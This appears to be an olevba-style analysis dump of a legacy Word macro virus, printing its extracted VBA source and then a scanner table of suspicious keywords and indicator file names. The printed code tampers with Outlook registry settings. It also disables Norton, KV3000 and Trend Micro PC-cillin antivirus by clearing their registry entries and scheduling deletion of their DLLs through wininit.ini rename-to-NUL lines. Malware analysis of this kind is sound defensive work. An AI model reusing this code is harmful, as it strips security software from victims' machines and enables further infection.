'SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail", "Poll For Mail Interval", 1, REG_DWORD
'CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Preferences"
'SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Preferences", "SaveSent", 0, REG_DWORD
'End Function
'Private Function NKPKVIRUS() As String
'If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "") <> "" Then
'nkpkpath$ = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "")
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "") = ""
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "ThreadingModel") = ""
'Do
'nkpk = nkpk + 1
'nkpkmid$ = Mid$(nkpkpath$, nkpk + 3, 1)
'If Asc(nkpkmid$) <> 92 Then
'If Asc(nkpkmid$) <> 32 Then
'npt$ = npt$ + nkpkmid$
'End If
'Else
'Exit Do
'End If
'Loop
'If Len(Trim$(npt$)) > 8 Then
'nkpath$ = Left$(Trim$(npt$), 6) & "~1"
'End If
'nkkill$ = Left$(nkpkpath$, 3) & nkpath$ & "\navshell.dll"
'Open MY & "\wininit.ini" For Output As #34
'Print #34, "[RENAME]"
'Print #34, "NUL="; nkkill$
'Close 34
'End If
'If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "StaticVxD") <> "" Then
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "StaticVxD") = ""
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "Enforcement") = ""
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "Start") = ""
'End If
'If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\KVW3000", "DisplayName") <> "" Then
'kv$ = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\KVW3000", "UninstallString")
'Do
'kv300 = kv300 + 1
'kvp$ = Mid$(kv$, kv300 + 3, 1)
'If Asc(kvp$) <> 92 Then
'If Asc(kvp$) <> 32 Then
'kvpath$ = kvpath$ + kvp$
'End If
'Else
'Exit Do
'End If
'Loop
'If Len(Trim$(kvpath$)) > 8 Then
'kvpath$ = Left$(Trim$(kvpath$), 6) & "~1"
'End If
'kvkill$ = Left$(kv$, 3) & kvpath$ & "\KVShell.dll"
'Open MY & "\wininit.ini" For Output As #34
'Print #34, "[RENAME]"
'Print #34, "NUL="; kvkill$
'Close 34
'End If
'If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TrendMicro\PC-cillin98\4.0", "register no.") <> "" Then
'Trendpath$ = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TrendMicro\PC-cillin98\4.0", "Application Path")
'Do
'pc = pc + 1
'Trend$ = Mid$(Trendpath$, pc + 3, 1)
'If Asc(Trend$) <> 92 Then
'If Asc(Trend$) <> 32 Then
'Trendmid$ = Trendmid$ + Trend$
'End If
'Else
'Exit Do
'End If
'Loop
'If Len(Trim$(Trendmid$)) > 8 Then
'Trendmid$ = Left$(Trim$(Trendmid$), 6) & "~1"
'End If
'Trendpath$ = Left$(Trendpath$, 3) & Trendmid$ & "\"
'Open MY & "\wininit.ini" For Output As #34
'Print #34, "[RENAME]"
'Print #34, "NUL="; Trendpath$; "PCC98RES.dll"
'Print #34, "NUL="; Trendpath$; "IO98RES.dll"
'Close 34
'End If
'End Function
'Private Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
'Dim lValue As Long
'Dim sValue As String
'If lType = REG_DWORD Then
'lValue = vValue
'SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)
'End If
'End Function
'Private Function CreateNewKey(lPredefinedKey As Long, sNewKeyName As String)
'Dim hNewKey As Long
'Dim lRetVal As Long
'lRetVal = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
'RegCloseKey (hNewKey)
'End Function
'Private Function SetKeyValue(lPredefinedKey As Long, sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long)
'Dim lRetVal As Long
'Dim hKey As Long
'lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
'lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)
'RegCloseKey (hKey)
'End Function
''Ver NO.WXR1.0
'END
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |winstart.bat        |Executable file name                         |
|IOC       |dosstart.bat        |Executable file name                         |
|IOC       |navshell.dll        |Executable file name                         |
|IOC       |KVShell.dll         |Executable file name                         |
|IOC       |PCC98RES.dll        |Executable file name                         |
|IOC       |IO98RES.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

